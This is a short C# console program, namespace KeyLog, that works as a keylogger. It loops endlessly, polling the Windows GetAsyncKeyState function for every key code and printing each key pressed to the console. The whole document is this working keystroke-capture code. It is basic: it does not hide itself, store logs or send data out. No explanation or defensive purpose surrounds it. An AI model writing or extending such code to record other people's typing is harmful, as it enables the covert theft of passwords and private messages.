using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;


namespace KeyLog
{

    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(int i);

        static void Main(string[] args)
        {
            LogKeys();
        }

        static void LogKeys()
        {
                KeysConverter converter = new KeysConverter();
                string text = "";
                while(true)
                {
                    Thread.Sleep(10);
                    for(int i = 0; i<255; i++)
                    {
                        int key = GetAsyncKeyState(i);
                        if (key == 1 || key == -32767)
                        {
                            text = converter.ConvertToString(i);
                            Console.WriteLine(text);
                            break;
                        }
                    }
                }
        } 
    }
}
